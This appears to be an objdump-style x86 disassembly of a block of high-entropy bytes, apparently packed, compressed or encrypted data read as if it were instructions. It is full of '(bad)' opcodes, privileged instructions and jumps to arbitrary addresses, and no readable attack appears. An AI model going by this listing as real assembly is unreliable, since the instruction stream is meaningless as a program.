  42b560:	push   ss
  42b561:	mov    eax,0x6b309762
  42b566:	add    DWORD PTR [esi],0x5
  42b569:	int    0x40
  42b56b:	imul   ecx,DWORD PTR [edi+esi*1-0x5c738b4e],0xffffffc5
  42b573:	int3   
  42b574:	ss std 
  42b576:	mov    ebx,0x7f2f8b2f
  42b57b:	mov    al,0xf5
  42b57d:	xor    DWORD PTR [ebx],edx
  42b57f:	stos   BYTE PTR es:[edi],al
  42b580:	mov    edi,0x1e085a3b
  42b585:	pop    eax
  42b586:	pop    ebx
  42b587:	fcomp  QWORD PTR [esi+0x56fa9557]
  42b58d:	mov    bl,0x47
  42b58f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  42b5f4:	loopne 0x42b58a
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	dec    eax
  42b601:	inc    ecx
  42b602:	cwde   
  42b603:	dec    esp
  42b604:	(bad)  
  42b605:	iret   
  42b606:	add    DWORD PTR [eax],eax
  42b608:	add    al,0x1
  42b60a:	add    BYTE PTR [eax],al
  42b60c:	mov    ebp,0x6a5e304a
  42b611:	(bad)  [esi+edi*1+0x35]
  42b615:	mov    al,ds:0x393689ca
  42b61a:	mov    dh,0x7f
  42b61c:	int    0x9f
  42b61e:	sbb    al,0x4b
  42b620:	pusha  
  42b621:	das    
  42b622:	mov    ebp,0x7af7c97b
  42b627:	fadd   DWORD PTR [esi+ecx*1+0x2bab5de6]
  42b62e:	push   cs
  42b62f:	mov    eax,ds:0x2e9a3951
  42b634:	and    eax,0x5a7a0275
  42b639:	scas   eax,DWORD PTR es:[edi]
  42b63a:	ret    0x1dd8
  42b63d:	mov    esi,0x36625005
  42b642:	loopne 0x42b610
  42b644:	sub    BYTE PTR [ebx-0x7f],bh
  42b647:	jmp    0x42b6a4
  42b649:	out    dx,eax
  42b64a:	fild   WORD PTR ds:0xa05e1760
  42b650:	and    DWORD PTR [ecx+esi*8],ecx
  42b653:	sbb    DWORD PTR es:[eax+edi*4],esp
  42b657:	rcr    esi,cl
  42b659:	cwde   
  42b65a:	mov    eax,ds:0xf5e9faa2
  42b65f:	ins    DWORD PTR es:[edi],dx
  42b660:	retf   
  42b661:	mov    esp,ecx
  42b663:	jmp    0x26cf9199
  42b668:	(bad)  
  42b669:	aam    0x1a
  42b66b:	jne    0x42b68d
  42b66d:	in     al,0x6d
  42b66f:	xor    edx,ecx
  42b671:	sbb    esp,DWORD PTR [edx+0x25]
  42b674:	dec    edx
  42b675:	cmp    edi,DWORD PTR [edi+eax*2+0x5ee0d530]
  42b67c:	and    cl,ah
  42b67e:	jae    0x42b62f
  42b680:	inc    ebp
  42b681:	gs cmp eax,0x387e271e
  42b687:	mov    esi,esp
  42b689:	popa   
  42b68a:	icebp  
  42b68b:	js     0x42b653
  42b68d:	test   BYTE PTR [eax+ecx*2],cl
  42b690:	sbb    dl,BYTE PTR [eax+0x599acf34]
  42b696:	or     DWORD PTR [ecx-0x779199a8],edx
  42b69c:	shr    DWORD PTR [ebx+0x29],1
  42b69f:	es test ebx,ecx
  42b6a2:	add    BYTE PTR [esi+0x12],bl
  42b6a5:	adc    ah,ch
  42b6a7:	and    al,0x88
  42b6a9:	push   0xe
  42b6ab:	or     eax,DWORD PTR [ecx]
  42b6ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b6ae:	xlat   BYTE PTR ds:[ebx]
  42b6af:	sbb    esi,eax
  42b6b1:	test   BYTE PTR [eax],dh
  42b6b3:	aas    
  42b6b4:	ret    
  42b6b5:	jbe    0x42b6c7
  42b6b7:	cmp    DWORD PTR [ebp+0x74],edi
  42b6ba:	jb     0x42b6d6
  42b6bc:	aad    0xb8
  42b6be:	out    0x58,eax
  42b6c0:	push   0x1ecf84b6
  42b6c5:	jl     0x42b6e0
  42b6c7:	mov    dl,0x61
  42b6c9:	int3   
  42b6ca:	hlt    
  42b6cb:	cmp    eax,DWORD PTR [ecx+edx*1]
  42b6ce:	fstp   QWORD PTR [edi-0x1c]
  42b6d1:	push   esp
  42b6d2:	and    ah,ch
  42b6d4:	addr16 retf 0xdc2e
  42b6d8:	push   ebx
  42b6d9:	je     0x42b6e0
  42b6db:	or     BYTE PTR [eax-0x763c5c8c],bh
  42b6e1:	or     DWORD PTR [ebx+0x5460056b],esi
  42b6e7:	fcom   st(2)
  42b6e9:	inc    eax
  42b6ea:	aad    0x1f
  42b6ec:	pop    eax
  42b6ed:	das    
  42b6ee:	jmp    0x42b6dd
  42b6f0:	pop    ecx
  42b6f1:	popf   
  42b6f2:	push   edi
  42b6f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b6f4:	adc    bl,al
  42b6f6:	push   0x69
  42b6f8:	scas   eax,DWORD PTR es:[edi]
  42b6f9:	pop    ecx
  42b6fa:	or     al,0xc9
  42b6fc:	mov    ch,0x96
  42b6fe:	xchg   ebp,ecx
  42b700:	stos   DWORD PTR es:[edi],eax
  42b701:	sbb    al,0xd6
  42b703:	jae    0x42b768
  42b705:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b706:	outs   dx,BYTE PTR ds:[esi]
  42b707:	aam    0x60
  42b709:	outs   dx,BYTE PTR ds:[esi]
  42b70a:	mov    dh,0xea
  42b70c:	push   cs
  42b70d:	cdq    
  42b70e:	adc    dh,bl
	...
  42b774:	dec    esi
  42b775:	inc    edx
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	loopne 0x42b767
  42b782:	enter  0xc819,0xd0
  42b786:	add    DWORD PTR [eax],eax
  42b788:	add    al,0x1
  42b78a:	add    BYTE PTR [eax],al
  42b78c:	cmp    eax,0x84697452
  42b791:	shr    DWORD PTR [esi+0x73],0x4d
  42b795:	fdiv   QWORD PTR [ecx]
  42b797:	mov    eax,ds:0xc8a28673
  42b79c:	popf   
  42b79d:	jmp    FWORD PTR [ebx+0x407ad391]
  42b7a3:	mov    DWORD PTR [ecx],edx
  42b7a5:	jg     0x42b76a
  42b7a7:	out    dx,al
  42b7a8:	test   BYTE PTR ds:0x63234c7c,dh
  42b7ae:	repz int3 
  42b7b0:	cld    
  42b7b1:	adc    eax,ecx
  42b7b3:	stos   DWORD PTR es:[edi],eax
  42b7b4:	and    ebp,0x42
  42b7b7:	aad    0x30
  42b7b9:	inc    eax
  42b7ba:	mov    esp,0x12feaf25
  42b7bf:	hlt    
  42b7c0:	sub    eax,DWORD PTR [esi+eax*8-0x77d2a170]
  42b7c7:	out    0x85,eax
  42b7c9:	frstor [edx]
  42b7cb:	push   esp
  42b7cc:	imul   edi,edi,0xb814e1a3
  42b7d2:	add    al,0x9b
  42b7d4:	shl    BYTE PTR [eax],cl
  42b7d6:	mov    cl,0xb4
  42b7d8:	jb     0x42b7d2
  42b7da:	imul   eax,DWORD PTR [ecx+0x4f],0x6e651e7d
  42b7e1:	push   es
  42b7e2:	inc    esi
  42b7e3:	mov    cl,0xff
  42b7e5:	dec    ecx
  42b7e6:	jmp    0x42b7f2
  42b7e8:	pop    ebp
  42b7e9:	dec    ebx
  42b7ea:	fmul   QWORD PTR [edi]
  42b7ec:	push   ecx
  42b7ed:	pop    edi
  42b7ee:	mov    dh,0x7e
  42b7f0:	call   0xa6dd830a
  42b7f5:	dec    BYTE PTR [edi]
  42b7f7:	mov    edi,0xf94559a4
  42b7fc:	push   ds
  42b7fd:	fcom   st(6)
  42b7ff:	int    0x4b
  42b801:	pop    ebx
  42b802:	cmc    
  42b803:	mov    edi,DWORD PTR [edi+0x21]
  42b806:	lea    edx,[edx+0x69]
  42b809:	jbe    0x42b7bb
  42b80b:	imul   esp,DWORD PTR [esi+0x171c6e51],0xffffff8f
  42b812:	xor    BYTE PTR [edi+edi*1],bh
  42b815:	shr    BYTE PTR [edx+0x3a],cl
  42b818:	push   ss
  42b819:	in     al,0x44
  42b81b:	pop    esi
  42b81c:	push   edi
  42b81d:	cmp    al,0x7a
  42b81f:	adc    BYTE PTR [eax],ch
  42b821:	(bad)
  42b825:	fidivr WORD PTR [edx]
  42b827:	sub    edx,DWORD PTR [ecx+0x3bdfb134]
  42b82d:	pop    ds
  42b82e:	jle    0x42b84b
  42b830:	outs   dx,BYTE PTR ds:[esi]
  42b831:	int    0xd7
  42b833:	sub    DWORD PTR [edi],edi
  42b835:	pop    esp
  42b836:	mov    al,ds:0xb546e076
  42b83b:	sub    DWORD PTR [ecx+edi*1],ebp
  42b83e:	cld    
  42b83f:	xchg   DWORD PTR [ebx-0x49f4e376],edx
  42b845:	icebp  
  42b846:	call   0x7829:0x135fb7c3
  42b84d:	ret    
  42b84e:	and    al,0xd3
  42b850:	into   
  42b851:	adc    ch,BYTE PTR [ecx-0x1d9b4bce]
  42b857:	call   0x9908:0xe4b67e9d
  42b85e:	test   DWORD PTR [ebx],edx
  42b860:	xor    eax,0xf127b726
  42b865:	mov    dl,0x44
  42b867:	jo     0x42b89a
  42b869:	scas   eax,DWORD PTR es:[edi]
  42b86a:	test   BYTE PTR [ecx+0x6f],dh
  42b86d:	nop
  42b86e:	fidiv  WORD PTR [esi]
  42b870:	pop    eax
  42b871:	sar    DWORD PTR [edx-0x39],cl
  42b874:	dec    edx
  42b875:	mov    esi,0x5433a56f
  42b87a:	gs sbb eax,0xf34d2e3
  42b880:	pop    esi
  42b881:	sub    DWORD PTR [edx],esi
  42b883:	inc    eax
  42b884:	cwde   
  42b885:	shl    DWORD PTR [esi],0x3
  42b888:	into   
  42b889:	mov    edi,DWORD PTR [ebx]
  42b88b:	xor    al,0xb
  42b88d:	push   ebx
  42b88e:	inc    ecx
  42b88f:	cmp    eax,DWORD PTR [eax]
	...
  42b8f1:	add    BYTE PTR [eax],al
  42b8f3:	add    al,ch
  42b8f5:	popf   
  42b8f6:	mov    esi,0xf9e7ffe7
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     edx,DWORD PTR [ebp-0x70]
  42b902:	shl    BYTE PTR [ebp+0x1d1cc],cl
  42b908:	add    al,0x1
  42b90a:	add    BYTE PTR [eax],al
  42b90c:	pop    ebp
  42b90d:	mov    BYTE PTR [eax+0x38],ch
  42b910:	dec    edx
  42b911:	push   0xead58a3e
  42b916:	popf   
  42b917:	sub    BYTE PTR [edx+0x45],ch
  42b91a:	mov    edi,fs
  42b91c:	hlt    
  42b91d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b91e:	data16 sub dh,ah
  42b921:	inc    edi
  42b922:	lahf   
  42b923:	mov    WORD PTR [ebx-0x299f3e14],fs
  42b929:	xor    BYTE PTR [ecx],0x33
  42b92c:	mov    ch,0xdc
  42b92e:	rol    DWORD PTR [esi-0x40],1
  42b931:	pushf  
  42b932:	call   edx
  42b934:	ins    BYTE PTR es:[edi],dx
  42b935:	(bad)
  42b939:	pop    ebx
  42b93a:	or     DWORD PTR [ecx],0x2c55bd20
  42b940:	cli    
  42b941:	addr16 fs and ebp,ebp
  42b945:	je     0x42b95b
  42b947:	jo     0x42b950
  42b949:	test   BYTE PTR [esi],bh
  42b94b:	mov    ebp,0xfbdaa763
  42b950:	jmp    0x42b968
  42b952:	ja     0x42b95b
  42b954:	mov    bl,0x31
  42b956:	stos   BYTE PTR es:[edi],al
  42b957:	retf   0x6bad
  42b95a:	and    ebp,edx
  42b95c:	stc    
  42b95d:	xor    DWORD PTR [ebx],edx
  42b95f:	fcmovnb st,st(0)
  42b961:	sbb    BYTE PTR [eax+0x2575b836],0xd7
  42b968:	adc    cl,ch
  42b96a:	aam    0xd5
  42b96c:	ret    
  42b96d:	sub    DWORD PTR cs:[eax+ecx*8+0x4a86e11d],ebp
  42b975:	xor    al,0x2b
  42b977:	add    ch,BYTE PTR [edi+0x1158de65]
  42b97d:	mov    esp,0x8baf18a2
  42b982:	dec    ebp
  42b983:	retf   
  42b984:	mov    dl,0x16
  42b986:	cmp    al,0x21
  42b988:	lsl    esp,WORD PTR [ecx+0x378ab512]
  42b98f:	jno    0x42b93f
  42b991:	in     eax,0xf6
  42b993:	mov    ds:0xda9b789b,al
  42b998:	mov    eax,ds:0xd4c4dfa9
  42b99d:	out    0x70,eax
  42b99f:	and    DWORD PTR [edi-0x5],edi
  42b9a2:	test   BYTE PTR [ecx+eiz*1-0x58da0054],dh
  42b9a9:	loopne 0x42b97f
  42b9ab:	imul   ecx,DWORD PTR [eax+edx*8],0xffffffa7
  42b9af:	scas   eax,DWORD PTR es:[edi]
  42b9b0:	popf   
  42b9b1:	fidiv  WORD PTR [edx+0x33]
  42b9b4:	int3   
  42b9b5:	mov    ebx,0xe63ab6b1
  42b9ba:	inc    esi
  42b9bb:	mov    cl,0x3f
  42b9bd:	sub    bh,ch
  42b9bf:	adc    esp,DWORD PTR [esi+0x32]
  42b9c2:	sub    edx,DWORD PTR [ebx+0x782e63f8]
  42b9c8:	mov    edi,0x40ef64a5
  42b9cd:	std    
  42b9ce:	jmp    0x42ba25
  42b9d0:	(bad)  
  42b9d1:	xor    ch,dl
  42b9d3:	jecxz  0x42b981
  42b9d5:	shl    ecx,1
  42b9d7:	pop    ds
  42b9d8:	out    0x1c,al
  42b9da:	or     eax,0xbe121340
  42b9df:	adc    eax,0x5a0c52bf
  42b9e4:	dec    esi
  42b9e5:	jns    0x42b9dd
  42b9e7:	mov    edi,0xeb2115a1
  42b9ec:	or     edi,0x22
  42b9ef:	adc    DWORD PTR [ebx],ebp
  42b9f1:	bound  edx,QWORD PTR ds:0xefe8c743
  42b9f7:	sar    DWORD PTR [edx-0x72],0xd3
  42b9fb:	scas   al,BYTE PTR es:[edi]
  42b9fc:	or     eax,DWORD PTR [ebp+0x7e]
  42b9ff:	xchg   ecx,eax
  42ba00:	out    0x93,al
  42ba02:	mov    esi,0x276f561b
  42ba07:	jbe    0x42ba57
  42ba09:	nop    DWORD PTR [edi]
  42ba0c:	sub    DWORD PTR [eax],esp
  42ba0e:	repz and al,0x0
	...
  42ba71:	add    BYTE PTR [eax],al
  42ba73:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba79:	neg    ebx
  42ba7b:	outs   dx,DWORD PTR ds:[esi]
  42ba7c:	push   0x5b
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [eax-0x2f0eb8e1],ecx
  42ba85:	rol    BYTE PTR [ecx],cl
  42ba87:	add    BYTE PTR [ecx+eax*1],al
  42ba8a:	add    BYTE PTR [eax],al
  42ba8c:	adc    eax,0x38ef1d5f
  42ba91:	xchg   edx,eax
  42ba92:	sbb    DWORD PTR [edi+0x6a],edx
  42ba95:	push   ebx
  42ba96:	cs in  eax,dx
  42ba98:	sub    eax,0x26c7e24d
  42ba9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ba9e:	adc    BYTE PTR [ecx],bl
  42baa0:	pop    ds
  42baa1:	out    0xb3,eax
  42baa3:	retf   
  42baa4:	sbb    esp,edx
  42baa6:	jmp    0x1587:0xae9abd54
  42baad:	jg     0x42babb
  42baaf:	cmp    BYTE PTR [ebp+0x7da57080],dh
  42bab5:	pop    ebx
  42bab6:	push   cs
  42bab7:	jo     0x42bafd
  42bab9:	adc    ebp,DWORD PTR [eax]
  42babb:	cmp    al,0xd9
  42babd:	int3   
  42babe:	xchg   esi,eax
  42babf:	pop    ss
  42bac0:	pop    esi
  42bac1:	imul   ecx,DWORD PTR [ebp+0x4c4ff288],0xf41e9282
  42bacb:	inc    esi
  42bacc:	push   esp
  42bacd:	lea    eax,[edi+0x1768e907]
  42bad3:	fdivr  st,st(4)
  42bad5:	pop    ds
  42bad6:	in     al,0x71
  42bad8:	sbb    BYTE PTR [eax+ecx*1+0x4f],al
  42badc:	loop   0x42bb2c
  42bade:	mov    esi,0x44ed6f58
  42bae3:	xchg   ebp,eax
  42bae4:	cdq    
  42bae5:	mov    dh,0xce
  42bae7:	mov    al,BYTE PTR [ebx-0x65d1de2e]
  42baed:	jmp    0x42baaa
  42baef:	(bad)  
  42baf0:	pop    esp
  42baf1:	jnp    0x42bb08
  42baf3:	jmp    0x42bb5e
  42baf5:	lock imul ecx,ebx,0xffffff9d
  42baf9:	push   es
  42bafa:	repz pop ebx
  42bafc:	pop    ecx
  42bafd:	out    dx,al
  42bafe:	push   0x1f
  42bb00:	jmp    0x3f6b1981
  42bb05:	leave  
  42bb06:	xchg   edi,eax
  42bb07:	fisttp QWORD PTR [ecx]
  42bb09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bb0a:	mov    WORD PTR [ebx-0x27],?
  42bb0d:	cmp    al,0x62
  42bb0f:	push   es
  42bb10:	pop    eax
  42bb11:	or     DWORD PTR [ebx],edi
  42bb13:	out    0xc8,eax
  42bb15:	enter  0x7d3f,0x7d
  42bb19:	lods   eax,DWORD PTR ds:[esi]
  42bb1a:	jle    0x42bb44
  42bb1c:	mov    BYTE PTR [esi+edi*2+0x52],al
  42bb20:	cmp    al,bl
  42bb22:	and    DWORD PTR [ebx+0x5a],eax
  42bb25:	lods   eax,DWORD PTR ds:[esi]
  42bb26:	addr16 out 0x91,eax
  42bb29:	dec    edi
  42bb2a:	fidivr WORD PTR [esi+0x1aa0fac4]
  42bb30:	cmp    ecx,DWORD PTR [ecx]
  42bb32:	mov    dh,0x6e
  42bb34:	ins    BYTE PTR es:[edi],dx
  42bb35:	pusha  
  42bb36:	xchg   bh,dh
  42bb38:	mov    WORD PTR [eax+0x12],cs
  42bb3b:	or     al,0xe1
  42bb3d:	jmp    0x42bb7d
  42bb3f:	pop    esi
  42bb40:	cmp    al,0x45
  42bb42:	std    
  42bb43:	ss out 0x82,al
  42bb46:	mov    ecx,0x29e17ce5
  42bb4b:	repnz sahf 
  42bb4d:	imul   edi,DWORD PTR [eax+edi*2+0x7a861734],0x48
  42bb55:	ficomp DWORD PTR [ebx-0x6e]
  42bb58:	ja     0x42bbcc
  42bb5a:	test   DWORD PTR [eax+0x2],edx
  42bb5d:	repz scas eax,DWORD PTR es:[edi]
  42bb5f:	loop   0x42bb95
  42bb61:	neg    DWORD PTR gs:[edx]
  42bb64:	je     0x42bb79
  42bb66:	sbb    BYTE PTR [esp+edi*2-0x65],0x11
  42bb6b:	mul    DWORD PTR [ebx+0x4a41cd0b]
  42bb71:	inc    esi
  42bb72:	sbb    dh,bl
  42bb74:	and    esi,DWORD PTR [esp+ecx*4+0x59]
  42bb78:	aas    
  42bb79:	xchg   esi,eax
  42bb7a:	ins    DWORD PTR es:[edi],dx
  42bb7b:	push   0x87f780c1
  42bb80:	lods   eax,DWORD PTR ds:[esi]
  42bb81:	rcr    DWORD PTR [ebx+0x3b],cl
  42bb84:	rol    esp,0x46
  42bb87:	mov    bl,BYTE PTR [esi+0x44]
  42bb8a:	sar    BYTE PTR [ebx+0x3158e17f],0x0
	...
  42bbf1:	add    BYTE PTR [eax],al
  42bbf3:	add    BYTE PTR [eax+ebp*1],dh
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	push   ebx
  42bc01:	add    BYTE PTR [ebp+0x1d3d46c],ch
  42bc07:	add    BYTE PTR [ecx+eax*1],al
  42bc0a:	add    BYTE PTR [eax],al
  42bc0c:	push   ds
  42bc0d:	inc    edx
  42bc0e:	imul   DWORD PTR [ecx-0x2feb5d5d]
  42bc14:	adc    cl,BYTE PTR [edx+ecx*2]
  42bc17:	pop    es
  42bc18:	out    dx,al
  42bc19:	rcr    esp,1
  42bc1b:	ins    BYTE PTR es:[edi],dx
  42bc1c:	adc    dl,BYTE PTR [esi]
  42bc1e:	aam    0x51
  42bc20:	jno    0x42bca0
  42bc22:	pop    ss
  42bc23:	mov    eax,ds:0xf6384981
  42bc28:	jnp    0x42bbc0
  42bc2a:	sbb    al,0xfa
  42bc2c:	mov    esp,0x5e370a42
  42bc31:	jo     0x42bcb2
  42bc33:	cmp    BYTE PTR [ebx-0x42],ch
  42bc36:	mov    ah,0x4a
  42bc38:	mov    edi,0x9266ee68
  42bc3d:	dec    edx
  42bc3e:	test   DWORD PTR [edx+0x155499de],edi
  42bc44:	pop    edi
  42bc45:	imul   DWORD PTR [esi+0x392f781c]
  42bc4b:	icebp  
  42bc4c:	call   0x2d32:0x21503bfc
  42bc53:	mov    esi,0x20764e67
  42bc58:	jnp    0x42bc9b
  42bc5a:	int    0x8a
  42bc5c:	xor    DWORD PTR [ebx+0x75],eax
  42bc5f:	shl    DWORD PTR [ebx],1
  42bc61:	popf   
  42bc62:	xchg   edx,eax
  42bc63:	and    DWORD PTR [edx+0x701ff3ae],esi
  42bc69:	dec    ebx
  42bc6a:	pop    es
  42bc6b:	jne    0x42bce3
  42bc6d:	or     eax,0x85386ef3
  42bc72:	fdivr  st(4),st
  42bc74:	xchg   ecx,eax
  42bc75:	mov    edx,0x4714a792
  42bc7a:	in     al,0x2
  42bc7c:	jmp    0x8a8d1358
  42bc81:	pop    esi
  42bc82:	jae    0x42bc5e
  42bc84:	sub    dh,BYTE PTR [esi]
  42bc86:	fadd   DWORD PTR [ebp+esi*8+0xabce0e8]
  42bc8d:	ja     0x42bc13
  42bc8f:	pop    ss
  42bc90:	dec    ebp
  42bc91:	loop   0x42bc1c
  42bc93:	mov    bl,0xb4
  42bc95:	(bad)  
  42bc97:	jnp    0x42bcd1
  42bc99:	stc    
  42bc9a:	sbb    al,0x25
  42bc9c:	mov    al,0xaf
  42bc9e:	xchg   ecx,esi
  42bca0:	lds    edx,FWORD PTR [esi-0x2f5d3051]
  42bca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bca7:	sbb    BYTE PTR [ebp+0x11],bh
  42bcaa:	aad    0x3a
  42bcac:	and    BYTE PTR [edi-0x9],bl
  42bcaf:	pop    ss
  42bcb0:	sub    DWORD PTR [ecx+0x2a],ebp
  42bcb3:	jle    0x42bca1
  42bcb5:	sub    eax,0xb9519d1d
  42bcba:	mov    edx,0x8394ce57
  42bcbf:	imul   ebp,DWORD PTR ds:0x6497c4b1,0xffffffdf
  42bcc6:	pop    edx
  42bcc7:	int    0xfa
  42bcc9:	test   DWORD PTR [esi+0x13fee9c4],ecx
  42bccf:	jecxz  0x42bca7
  42bcd1:	xchg   ecx,eax
  42bcd2:	push   0x39
  42bcd4:	or     DWORD PTR [eax+eax*4-0x12],edi
  42bcd8:	aas    
  42bcd9:	popa   
  42bcda:	push   edi
  42bcdb:	jo     0x42bd5b
  42bcdd:	jae    0x42bc8d
  42bcdf:	(bad)  
  42bce0:	xchg   edi,eax
  42bce1:	mov    ds:0xc3504fda,al
  42bce6:	mov    eax,ds:0xfb020cfb
  42bceb:	adc    al,bh
  42bced:	cmp    ebp,0xd88b13ef
  42bcf3:	icebp  
  42bcf4:	enter  0xa880,0x72
  42bcf8:	mov    edi,DWORD PTR [ebx-0x65]
  42bcfb:	mov    al,0x4f
  42bcfd:	dec    ecx
  42bcfe:	ret    
  42bcff:	cmp    eax,0x681160ab
  42bd04:	popa   
  42bd05:	dec    ebx
  42bd06:	dec    esi
  42bd07:	call   0xdb69:0x3cc617af
  42bd0e:	push   ebx
  42bd0f:	inc    BYTE PTR [eax]
	...
  42bd71:	add    BYTE PTR [eax],al
  42bd73:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bdc9
  42bd81:	inc    ebp
  42bd82:	mov    fs,WORD PTR [edx+0x1d4d8]
  42bd88:	add    al,0x1
  42bd8a:	add    BYTE PTR [eax],al
  42bd8c:	mov    al,0xdc
  42bd8e:	adc    eax,0xa50f1698
  42bd93:	or     eax,0x88168de5
  42bd98:	ret    
  42bd99:	mov    gs,eax
  42bd9b:	mov    ss,WORD PTR [bp+di+0x56]
  42bd9f:	nop
  42bda0:	(bad)  
  42bda1:	fiadd  WORD PTR [ebp+0x2f]
  42bda4:	sub    DWORD PTR [eax+edx*1-0x32986c6c],0xa48edd22
  42bdaf:	fild   DWORD PTR [eax-0x2f]
  42bdb2:	stc    
  42bdb3:	(bad)  [eax+0x54]
  42bdb6:	add    dl,ah
  42bdb8:	add    BYTE PTR [esi],dh
  42bdba:	clc    
  42bdbb:	pop    ss
  42bdbc:	retf   
  42bdbd:	adc    eax,0xbf95f6e8
  42bdc2:	ss into 
  42bdc4:	push   esi
  42bdc5:	sub    eax,0x6fcf9a94
  42bdca:	out    dx,eax
  42bdcb:	xor    al,0x70
  42bdcd:	ins    DWORD PTR es:[edi],dx
  42bdce:	mov    ebp,0x24815e2e
  42bdd3:	ds jb  0x42bdb1
  42bdd6:	js     0x42bdbc
  42bdd8:	fsubp  st(7),st
  42bdda:	lock das 
  42bddc:	push   ecx
  42bddd:	call   0xd4d44fc7
  42bde2:	call   0x7f2e:0x30389f2b
  42bde9:	in     eax,0xcd
  42bdeb:	and    ecx,ebp
  42bded:	jmp    DWORD PTR [eax]
  42bdef:	push   0xffffffc8
  42bdf1:	sti    
  42bdf2:	dec    esp
  42bdf3:	out    0x23,al
  42bdf5:	ds pop ebx
  42bdf7:	pop    ebx
  42bdf8:	xchg   ebx,eax
  42bdf9:	out    0x29,eax
  42bdfb:	mov    dl,0xdd
  42bdfd:	jne    0x42bdb1
  42bdff:	ror    BYTE PTR [eax],1
  42be01:	(bad)  
  42be02:	mov    ebp,0x740d7267
  42be07:	sub    cl,BYTE PTR [edi+eiz*8+0xe]
  42be0b:	inc    esi
  42be0c:	ss retf 
  42be0e:	jno    0x42bdf9
  42be10:	mov    ebx,0x219eb02c
  42be15:	dec    edi
  42be16:	stos   DWORD PTR es:[edi],eax
  42be17:	cmp    al,0x8b
  42be19:	aad    0x3a
  42be1b:	shl    esp,0x88
  42be1e:	add    BYTE PTR [ebx],dh
  42be20:	(bad)  
  42be21:	mov    esi,edx
  42be23:	pop    ss
  42be24:	ins    DWORD PTR es:[edi],dx
  42be25:	sub    ah,BYTE PTR [edx]
  42be27:	ins    DWORD PTR es:[edi],dx
  42be28:	pop    esi
  42be29:	and    al,0x1e
  42be2b:	sbb    al,0xc2
  42be2d:	mov    ds:0x9c5669ab,eax
  42be32:	mov    ah,0xcc
  42be34:	cmc    
  42be35:	pop    ds
  42be36:	iret   
  42be37:	hlt    
  42be38:	out    dx,al
  42be39:	frstor [esi+0x2e]
  42be3c:	pop    ds
  42be3d:	(bad)  
  42be3e:	push   ss
  42be3f:	inc    ecx
  42be40:	test   eax,0x380686a9
  42be45:	or     BYTE PTR [edx+0x37],bh
  42be48:	push   es
  42be49:	pop    ebp
  42be4a:	fs rol ch,cl
  42be4d:	aas    
  42be4e:	ss jne 0x42be22
  42be51:	sub    eax,0xce50bd7f
  42be56:	pop    esi
  42be57:	enter  0xc58a,0xb
  42be5b:	jo     0x42bdea
  42be5d:	cld    
  42be5e:	jae    0x42be16
  42be60:	in     al,dx
  42be61:	lock xchg esi,eax
  42be63:	fbstp  TBYTE PTR ds:0xd6489164
  42be69:	data16 jl 0x42beb1
  42be6c:	in     al,0x3c
  42be6e:	ficom  WORD PTR [ecx-0x2a]
  42be71:	sbb    eax,0x5cbdc159
  42be76:	push   edx
  42be77:	cld    
  42be78:	cmc    
  42be79:	xchg   ebx,eax
  42be7a:	pop    es
  42be7b:	ja     0x42bea8
  42be7d:	fcom   QWORD PTR [esi-0x3c]
  42be80:	shr    DWORD PTR [ebp-0x56],0x4f
  42be84:	dec    ebp
  42be85:	loope  0x42beec
  42be87:	or     DWORD PTR [edx+0x6d],0xffffffe0
  42be8b:	cmp    eax,0x8b066156
	...
  42bef4:	xchg   edi,eax
  42bef5:	and    BYTE PTR [edi-0x26],al
  42bef8:	idiv   edi
  42befa:	lahf   
  42befb:	ins    DWORD PTR es:[edi],dx
  42befc:	mov    ds:0x6e7bd7c8,eax
  42bf01:	lods   al,BYTE PTR ds:[si]
  42bf03:	iret   
  42bf04:	(bad)  
  42bf06:	add    DWORD PTR [eax],eax
  42bf08:	add    al,0x1
  42bf0a:	add    BYTE PTR [eax],al
  42bf0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bf0d:	data16 test ch,dl
  42bf10:	or     eax,0xbefe52d3
  42bf15:	scas   eax,DWORD PTR es:[edi]
  42bf16:	xor    BYTE PTR [esi+edx*2-0x4c8f0834],0xa5
  42bf1e:	repz push edi
  42bf20:	push   esi
  42bf21:	jae    0x42bf85
  42bf23:	call   0x31dbab26
  42bf28:	clc    
  42bf29:	push   0x8979162e
  42bf2e:	inc    edx
  42bf2f:	sbb    ch,0x5f
  42bf32:	dec    edi
  42bf33:	lods   eax,DWORD PTR ds:[esi]
  42bf34:	rcr    ah,cl
  42bf36:	scas   eax,DWORD PTR es:[edi]
  42bf37:	push   0x38
  42bf39:	stc    
  42bf3a:	inc    ecx
  42bf3b:	fild   QWORD PTR [ecx]
  42bf3d:	sub    ah,BYTE PTR [edx+0xb]
  42bf40:	pop    esp
  42bf41:	push   es
  42bf42:	jecxz  0x42bf0c
  42bf44:	shr    BYTE PTR [edi+0x55759d93],1
  42bf4a:	mov    ds:0xc0a90cfe,al
  42bf4f:	sbb    BYTE PTR [edx-0x5223134b],dh
  42bf55:	loopne 0x42bfc5
  42bf57:	pop    esi
  42bf58:	gs retf 
  42bf5a:	add    ebp,ebx
  42bf5c:	fild   DWORD PTR [edi+ecx*1]
  42bf5f:	hlt    
  42bf60:	adc    ebp,DWORD PTR [ebx]
  42bf62:	jmp    0x10b5bfe0
  42bf67:	jge    0x42bf56
